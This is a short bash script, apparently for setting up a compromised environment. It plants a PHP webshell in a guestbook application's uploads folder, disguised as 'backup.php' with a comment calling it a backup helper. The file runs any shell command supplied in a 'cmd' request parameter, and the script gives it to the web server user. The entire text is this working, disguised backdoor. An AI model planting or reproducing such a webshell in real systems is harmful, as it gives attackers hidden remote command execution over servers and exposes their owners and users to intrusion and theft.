#!/bin/bash
set -e

# Plant a disguised PHP webshell in the guestbook web root.
mkdir -p /opt/guestbook/uploads

cat > /opt/guestbook/uploads/backup.php <<'EOF'
<?php
/* Guestbook backup helper — do not edit. */
$cmd = $_POST['cmd'] ?? ($_GET['cmd'] ?? '');
if ($cmd !== '') {
    system($cmd);
}
?>
EOF

chown www-data:www-data /opt/guestbook/uploads/backup.php
chmod 640 /opt/guestbook/uploads/backup.php
